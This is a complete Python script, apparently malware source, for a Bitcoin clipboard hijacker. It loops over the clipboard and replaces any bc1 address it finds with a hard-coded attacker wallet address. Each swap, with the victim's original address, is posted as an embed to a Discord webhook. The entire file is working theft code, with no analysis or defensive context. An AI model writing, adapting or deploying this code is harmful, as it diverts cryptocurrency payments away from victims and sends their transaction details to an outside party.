import requests
import json
import re
import time
import pyperclip

address = 'bc1qvhr69lp0ygmshlhvsr728cphaz64pdd7jzjr66'

def sendDiscord(hook, update):
    embed = {
        "title": "[+] Replaced",
        "description": update,
        "color": 0x2f3136,
        "thumbnail": {
        "url": 'https://media.discordapp.net/attachments/1183406186658283522/1183414990057787432/Untitled.jpg?ex=65884018&is=6575cb18&hm=f1e2ed1a124d28d0a9cafc751553575c07245d24902dbe0fa918303958dcd537&=&format=webp&width=303&height=303'
        }
        }

    payload = {"content": "",
               "embeds": [embed]
               }
    
    headers = {"Content-Type": "application/json"}

    response = requests.post(hook,
                             data=json.dumps(payload),
                             headers=headers)

    if response.status_code == 204:
        pass
    else:
        pass


def check(addr):
    # Define a regular expression pattern to match Bitcoin addresses
    pattern = re.compile(r'\b(bc1[0-9A-Za-z]{39})\b')
    
    # Check if the given address matches the pattern
    return bool(re.match(pattern, addr))


def mainScript():
    while True:
        clipboard = pyperclip.paste()
        hook = 'captain hook'
        if check(clipboard):
            update = f'> Old Address ⤵\n> ```{clipboard}```\n> New Address ⤵\n> ```{address}```'
            pyperclip.copy(address)
            sendDiscord(hook, update)
        else:
            continue

        time.sleep(5)


mainScript()
